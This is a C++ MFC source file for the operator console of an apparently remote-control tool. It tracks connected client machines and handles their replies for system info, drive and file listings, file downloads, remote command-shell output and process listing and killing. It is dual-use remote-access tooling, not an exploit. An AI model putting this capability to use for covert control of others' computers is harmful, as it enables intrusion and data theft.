#include "stdafx.h"
#include "ItemData.h"



CItemData::CItemData(UINT id, SOCKET sock, SOCKADDR_IN *addr, HWND m_hWnd)
{
	
	this->m_id = id;
	this->m_sock = sock;
	this->m_hWnd = m_hWnd;
	char *csIP = inet_ntoa(addr->sin_addr);
	
	m_IP = csIP;
	m_Address.Format(_T("未知"));

	
	//初始化指针
	m_filedlg = NULL;
	m_cmdshell = NULL;
	m_task = NULL;
}


CItemData::~CItemData()
{
}

DWORD WINAPI CItemData::OnListen(LPVOID lp)
{
	CItemData* t = (CItemData*)lp;
	t->OnBeginListen();
	return 0;
}

/*
功能：启动监听线程
*/
void CItemData::Run()
{
	::CloseHandle(CreateThread(0, 0, OnListen, (LPVOID)this, 0, 0));
}

void CItemData::OnBeginListen() //等待完善
{
	int nRet;
	MSGINFO msg;
	memset(&msg, 0, sizeof(MSGINFO));
	msg.Msg_id = SYSINFO;
	nRet = m_Mysocket.SendCommand(m_sock, (char*)&msg, sizeof(MSGINFO));
	if (nRet == SOCKET_ERROR)
	{
		MessageBox(_T("获取系统信息消息发送失败"), _T("警告"), MB_OK | MB_ICONWARNING);
	}
	memset(&msg, 0, sizeof(msg));
	while (true)
	{
		nRet = m_Mysocket.RecvCommand(m_sock, (char*)&msg, sizeof(MSGINFO));
		if (nRet == 0)
		{
			if (WSAGetLastError() == WSAEWOULDBLOCK)
			{
				Sleep(50);
				continue;
			}
			else
			{
				::closesocket(m_sock);
				::SendMessage(this->m_hWnd, ID_OFFLINE, this->m_id, 0);
				return;
			}
		}
		else
		{
			switch (msg.Msg_id)
			{
			case SYSINFO:
			{
							SYSTEMINFO systeminfo;
							memset(&systeminfo, 0, sizeof(SYSTEMINFO));
							memcpy(&systeminfo, msg.context, sizeof(SYSTEMINFO));
							GetSysVer(systeminfo);
							::SendMessage(m_hWnd, ID_ONLINE, (WPARAM)this, 0);
			}
				break;
			case DISKINFO:
			{
							 DRIVER dir;
							 memset(&dir, 0, sizeof(DRIVER));
							 memcpy(&dir, msg.context, sizeof(DRIVER));
							 m_filedlg->m_fileview->setDisk(dir);                         

			}
				break;
			case FILELIST:
			{
							 if (m_filedlg == NULL)
							 {
								 break;
							 }
							 FILEINFO fileinfo;
							 memset(&fileinfo, 0, sizeof(FILEINFO));
							 memcpy(&fileinfo, msg.context, sizeof(FILEINFO));
							 m_filedlg->m_fileview->FileList(fileinfo);
			}
				break;
			case DOWNLOAD:
			{
							 if (m_filedlg == NULL)
							 {
								 break;
							 }
							 DOWNFILEDATA fi;
							 memset(&fi, 0, sizeof(DOWNFILEDATA));
							 memcpy(&fi, msg.context, sizeof(DOWNFILEDATA));
							 m_filedlg->m_filetrans->GetFileData(fi);
			}
				break;
			case CMDSHELL:
			{
							 if (m_cmdshell == NULL)
								 break;
							 CMD t;
							 memset(&t, 0, sizeof(CMD));
							 memcpy(&t, msg.context, sizeof(CMD));
							 m_cmdshell->GetReturnInfo(t);

			}
				break;
			case TASKLIST:
			{
							 if (m_task == NULL)
								 break;
							 TASK t;
							 memset(&t, 0, sizeof(TASK));
							 memcpy(&t, msg.context, sizeof(TASK));
							 m_task->GetTask(t);

			}
				break;
			case TASKKILL:
			{
							 if (m_task == NULL)
							 {
								 break;
							 }
							 char t[2];
							 strcpy_s(t, sizeof(t), (char*)msg.context);
							 m_task->GetResult(t);
			}
				break;
			}
		}
	}
}
void CItemData::GetSysVer(SYSTEMINFO sys)
{
	this->Cam = sys.Cam;
	this->m_Ver.Format(_T("%0.2lf 测试版"), sys.ver);
	switch (sys.os)
	{
	case 4:
		this->m_OS.Format(_T("Windows 7"));
		break;
	case 3:
		this->m_OS.Format(_T("Windows Vista"));
		break;
	case 2:
		this->m_OS.Format(_T("Windows 2003"));
		break;
	case 1:
		this->m_OS.Format(_T("Windows XP"));
		break;
	case 0:
		this->m_OS.Format(_T("Windows 2000"));
		break;
	default:
		this->m_OS.Format(_T("未知系统版本"));
		break;
	}
}
SOCKET CItemData::GetSocket()
{
	return this->m_sock;
}

void CItemData::RunToFileManager()
{
	if (m_filedlg == NULL)
	{
		m_filedlg = new CFileDlg(this, m_sock);
		m_filedlg->Create(IDD_FILE_DLG, this);
		m_filedlg->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_filedlg->SetActiveWindow();
	}
}

void CItemData::RunToCmdShell()
{
	if (m_cmdshell == NULL)
	{
		m_cmdshell = new CCMDShell(this, m_sock);
		m_cmdshell->Create(IDD_CMDSHELL, this);
		m_cmdshell->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_cmdshell->SetActiveWindow();
	}
}

void CItemData::RunToTask()
{
	if (m_task == NULL)
	{
		m_task = new CTask(this, m_sock);
		m_task->Create(IDD_TASK_DLG, this);
		m_task->ShowWindow(SW_NORMAL);
	}
	else
	{
		m_task->SetActiveWindow();
	}
}